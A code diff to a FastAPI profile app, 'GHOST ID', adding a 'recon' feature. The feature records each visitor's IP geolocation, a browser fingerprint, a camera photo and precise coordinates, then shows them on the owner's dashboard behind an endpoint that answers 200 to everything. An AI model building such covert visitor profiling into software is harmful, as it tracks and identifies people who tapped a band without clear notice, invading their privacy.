@@ -22,11 +22,13 @@ from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from starlette.exceptions import HTTPException as StarletteHTTPException
 
-from . import db, notify, security
+from . import db, geo, notify, security, useragent
 from .config import settings
 
 BASE = Path(__file__).resolve().parent
 DEVICE_COOKIE = "ghost_device"
+RECON_TTL = 3600          # a beacon token is accepted for 1 hour after the tap
+MAX_PHOTO = 300_000       # ~220 KB data URL cap for a consent camera still
 
 app = FastAPI(title="GHOST ID", docs_url=None, redoc_url=None, openapi_url=None)
 app.mount("/static", StaticFiles(directory=BASE / "static"), name="static")
@@ -136,19 +138,79 @@ def tap(request: Request, band_id: str):
     require_band(band_id)
     dev = owner_device(request)
     ip, ua = client_ip(request), request.headers.get("user-agent", "")[:200]
+    lang = request.headers.get("accept-language", "")[:120]
+    referer = request.headers.get("referer", "")[:300]
+    token = security.new_token()
     with db.tx() as c:
-        c.execute("INSERT INTO taps (ts, band_id, ip, ua, is_owner) VALUES (?,?,?,?,?)",
-                  (time.time(), band_id, ip, ua, int(dev is not None)))
+        cur = c.execute(
+            "INSERT INTO taps (ts, band_id, ip, ua, is_owner, lang, referer, token)"
+            " VALUES (?,?,?,?,?,?,?,?)",
+            (time.time(), band_id, ip, ua, int(dev is not None), lang, referer, token),
+        )
+        tap_id = cur.lastrowid
         if dev:
             db.audit(c, f"owner:{dev['label']}", "owner_tap", "", ip)
         else:
-            db.audit(c, "visitor", "tap", ua[:80], ip)
+            db.audit(c, "visitor", "tap", useragent.summarise(ua), ip)
     if dev:
         return RedirectResponse("/admin", status_code=303)
+    geo.lookup_async(tap_id, ip)
     if settings.notify_taps:
-        notify.push("GHOST ID: band tapped", f"Someone opened your profile ({ip}).", tags="wave")
+        notify.push("GHOST ID: band tapped",
+                    f"{useragent.summarise(ua)} opened your profile ({ip}).", tags="wave")
+    # token lets this visitor's browser post its own recon back; owner-only to view.
+    recon_token = token if settings.recon_enabled else None
     return templates.TemplateResponse(request, "profile.html", {
-        "profile": load_profile(), "band_id": band_id})
+        "profile": load_profile(), "band_id": band_id, "recon_token": recon_token})
+
+
+@app.post("/t/{band_id}/recon")
+async def recon(request: Request, band_id: str):
+    """Receive the browser beacon for a tap. Deliberately answers 200 to
+    everything so a probe learns nothing about what was or wasn't stored."""
+    require_band(band_id)
+    if not settings.recon_enabled:
+        return JSONResponse({"ok": True})
+    try:
+        body = await request.json()
+    except Exception:
+        return JSONResponse({"ok": True})
+    token = str(body.get("token", ""))[:200]
+    if not token:
+        return JSONResponse({"ok": True})
+    now = time.time()
+    with db.tx() as c:
+        row = c.execute("SELECT * FROM taps WHERE token = ? AND band_id = ?",
+                        (token, band_id)).fetchone()
+        if not row or row["is_owner"] or (now - row["ts"]) > RECON_TTL:
+            return JSONResponse({"ok": True})
+
+        fp = body.get("fp")
+        fp_json = json.dumps(fp)[:4000] if isinstance(fp, dict) else None
+
+        photo = body.get("photo")
+        if not (isinstance(photo, str) and photo.startswith("data:image/") and len(photo) <= MAX_PHOTO):
+            photo = None
+
+        def num(v):
+            return float(v) if isinstance(v, (int, float)) else None
+        lat, lon, acc = num(body.get("lat")), num(body.get("lon")), num(body.get("acc"))
+
+        c.execute(
+            "INSERT INTO recon (tap_id, ts, ip, fp, photo, lat, lon, acc)"
+            " VALUES (?,?,?,?,?,?,?,?)"
+            " ON CONFLICT(tap_id) DO UPDATE SET ts = excluded.ts,"
+            "   fp = COALESCE(excluded.fp, recon.fp),"
+            "   photo = COALESCE(excluded.photo, recon.photo),"
+            "   lat = COALESCE(excluded.lat, recon.lat),"
+            "   lon = COALESCE(excluded.lon, recon.lon),"
+            "   acc = COALESCE(excluded.acc, recon.acc)",
+            (row["id"], now, row["ip"], fp_json, photo, lat, lon, acc),
+        )
+        detail = ", ".join(k for k, v in
+                           (("fingerprint", fp_json), ("photo", photo), ("location", lat)) if v)
+        db.audit(c, "visitor", "recon_captured", detail, row["ip"])
+    return JSONResponse({"ok": True})
 
 
 @app.get("/t/{band_id}/contact.vcf")
@@ -229,15 +291,41 @@ def dashboard(request: Request):
         devices = c.execute("SELECT * FROM devices WHERE revoked = 0 AND expires > ? ORDER BY created",
                             (now,)).fetchall()
         links = c.execute("SELECT * FROM resources ORDER BY id").fetchall()
-        taps = c.execute("SELECT * FROM taps WHERE is_owner = 0 ORDER BY id DESC LIMIT 15").fetchall()
+        rows = c.execute(
+            "SELECT t.*, r.fp, r.photo, r.lat, r.lon, r.acc FROM taps t"
+            " LEFT JOIN recon r ON r.tap_id = t.id"
+            " WHERE t.is_owner = 0 ORDER BY t.id DESC LIMIT 20").fetchall()
         audit = c.execute("SELECT * FROM audit ORDER BY id DESC LIMIT 40").fetchall()
         tap_count = c.execute("SELECT COUNT(*) FROM taps WHERE is_owner = 0 AND ts > ?",
                               (now - 86400,)).fetchone()[0]
+    taps = [_recon_view(r) for r in rows]
     return templates.TemplateResponse(request, "admin.html", {
         "owner": owner, "me": me, "devices": devices, "links": links, "taps": taps,
         "audit": audit, "tap_count": tap_count,
         "band_url": f"{settings.base_url}/t/{owner['band_id']}",
     })
+
+
+def _recon_view(r) -> dict:
+    """Flatten a tap + its recon into display-ready fields for the dashboard."""
+    geo = json.loads(r["geo"]) if r["geo"] else {}
+    place = ", ".join(v for v in (geo.get("city"), geo.get("region"), geo.get("country")) if v)
+    fp = json.loads(r["fp"]) if r["fp"] else {}
+    rows = []
+    for key, label in (("screen", "Screen"), ("viewport", "Viewport"), ("tz", "Time zone"),
+                       ("langs", "Languages"), ("platform", "Platform"), ("cores", "CPU cores"),
+                       ("memory", "RAM (GB)"), ("gpu", "GPU"), ("touch", "Touch points"),
+                       ("battery", "Battery"), ("network", "Network")):
+        if fp.get(key) not in (None, "", []):
+            val = fp[key]
+            rows.append((label, ", ".join(map(str, val)) if isinstance(val, list) else str(val)))
+    maps = f"https://www.google.com/maps?q={r['lat']},{r['lon']}" if r["lat"] is not None else None
+    return {
+        "ts": r["ts"], "ip": r["ip"], "device": useragent.summarise(r["ua"] or ""),
+        "ua": r["ua"] or "", "lang": r["lang"] or "", "referer": r["referer"] or "",
+        "place": place, "org": geo.get("org"), "fp": rows, "photo": r["photo"],
+        "lat": r["lat"], "lon": r["lon"], "acc": r["acc"], "maps": maps,
+    }
 
 
 @app.get("/admin/preview", response_class=HTMLResponse)
